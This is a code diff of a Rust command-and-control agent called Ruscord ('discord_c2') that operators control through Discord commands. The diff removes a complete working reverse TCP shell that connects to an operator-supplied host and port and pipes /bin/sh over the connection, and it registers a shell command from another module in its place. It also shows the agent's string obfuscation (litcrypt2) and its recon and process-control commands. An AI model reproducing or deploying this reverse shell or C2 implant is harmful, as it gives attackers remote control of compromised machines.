@@ -1,26 +1,14 @@
-use std::{net::IpAddr, process::Stdio, sync::Arc};
-
 use commands::{process, recon, utils};
 use config::AgentConfig;
 use constants::RUSCORD_GUILD_ID;
-use poise::{
-	serenity_prelude::{self as serenity, futures::StreamExt},
-	FrameworkError,
-};
-use tokio::{
-	io::{AsyncReadExt, AsyncWriteExt},
-	net::TcpStream,
-	process::Command,
-	sync::Mutex,
-};
-use tokio_util::codec::{FramedRead, LinesCodec};
+use poise::FrameworkError;
+use tokio::sync::Mutex;
 use tracing::{info, warn};
 use tracing_subscriber::EnvFilter;
 mod commands;
 mod config;
 mod os;
-pub const MAX_DISCORD_CHARS: usize = 2000;
-
+use poise::serenity_prelude::{self as serenity};
 #[macro_use]
 extern crate litcrypt2;
 use_litcrypt!();
@@ -39,84 +27,13 @@ pub struct Data {
 pub type RuscordError = Box<dyn std::error::Error + Send + Sync>;
 pub type RuscordContext<'a> = poise::Context<'a, Data, RuscordError>;
 
-/// Initializes a reverse TCP shell to the given LHOST and LPORT.
-#[poise::command(prefix_command)]
-async fn shell(
-	ctx: RuscordContext<'_>, #[description = "LHOST"] listening_ip: IpAddr,
-	#[description = "LPORT"] listening_port: u16,
-) -> Result<(), RuscordError> {
-	match TcpStream::connect((listening_ip, listening_port)).await {
-		Ok(stream) => {
-			reply!(ctx, "Successfully connected to {}:{}", listening_ip, listening_port);
-			let mut cmd = Command::new("/bin/sh")
-				.stderr(Stdio::piped())
-				.stdin(Stdio::piped())
-				.stdout(Stdio::piped())
-				.spawn()?;
-
-			let (tcp_read, tcp_write) = stream.into_split();
-			let (tcp_read, tcp_write) = (Arc::new(Mutex::new(tcp_read)), Arc::new(Mutex::new(tcp_write)));
-
-			// Handle stdout
-			if let Some(stdout) = cmd.stdout.take() {
-				let mut reader = FramedRead::new(stdout, LinesCodec::new());
-				tokio::spawn({
-					let cloned_write = tcp_write.clone();
-					async move {
-						while let Some(Ok(line)) = reader.next().await {
-							let mut guard = cloned_write.lock().await;
-							guard.write_all(line.as_bytes()).await.unwrap();
-							guard.write_all(&[b'\n']).await.unwrap();
-							guard.flush().await.unwrap();
-						}
-					}
-				});
-			}
-
-			// Handle stderr
-			if let Some(stderr) = cmd.stderr.take() {
-				let mut reader = FramedRead::new(stderr, LinesCodec::new());
-				tokio::spawn(async move {
-					while let Some(Ok(line)) = reader.next().await {
-						let mut guard = tcp_write.lock().await;
-						guard.write_all(line.as_bytes()).await.unwrap();
-						guard.write_all(&[b'\n']).await.unwrap();
-						guard.flush().await.unwrap();
-					}
-				});
-			}
-
-			// Handle stdin
-			if let Some(mut stdin) = cmd.stdin.take() {
-				let mut reader = [0; 8024 * 2];
-				tokio::spawn(async move {
-					while let Ok(n) = tcp_read.lock().await.read(&mut reader).await {
-						if n == 0 {
-							break;
-						}
-						stdin.write_all(&reader[..n]).await.unwrap();
-						stdin.flush().await.unwrap();
-					}
-				});
-			}
-		},
-		Err(error) => {
-			reply!(
-				ctx,
-				"Failed to connect to listener at `{}:{}`: \n> \"{}\"",
-				listening_ip,
-				listening_port,
-				error
-			);
-		},
-	}
-
-	Ok(())
-}
-
 #[tokio::main]
 async fn main() {
-	std::env::set_var("RUST_LOG", "warn,discord_c2=debug");
+	// SAFETY: This is safe because there should be no additional threads
+	// spawned at this point.
+	unsafe {
+		std::env::set_var("RUST_LOG", "warn,discord_c2=debug");
+	}
 	tracing_subscriber::fmt()
 		.with_env_filter(EnvFilter::from_default_env())
 		.init();
@@ -136,6 +53,7 @@ async fn main() {
 				recon::processes(),
 				process::spawn(),
 				process::kill(),
+				process::shell(),
 			],
 			event_handler: |ctx, event, framework, data| Box::pin(event_handler(ctx, event, framework, data)),
 			on_error: |error| {
@@ -144,7 +62,11 @@ async fn main() {
 						FrameworkError::Command { error, ctx, .. } => {
 							reply!(ctx, "{error}");
 						},
-						other => poise::builtins::on_error(other).await.unwrap(),
+						other => {
+							if let Err(why) = poise::builtins::on_error(other).await {
+								tracing::error!("error sending discord message: {}", why);
+							}
+						},
 					}
 				})
 			},
